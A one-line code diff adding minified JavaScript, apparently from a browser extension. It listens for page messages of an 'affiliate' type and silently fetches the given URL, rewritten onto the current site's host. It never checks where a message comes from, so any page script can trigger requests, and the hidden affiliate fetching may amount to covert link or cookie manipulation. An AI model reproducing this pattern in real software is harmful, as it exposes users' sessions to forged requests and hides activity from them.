@@ -1,0 +1,1 @@
+window.addEventListener("message",(t=>{if(t&&t.data){const{type:e,payload:a}=t.data;if("MESSAGE_FETCH_AFFILIATE_TO_DOM"===e&&a){const t=new URL(a),e=a.replace(t.host,window.location.host);fetch(e).then((()=>{}))}}}));
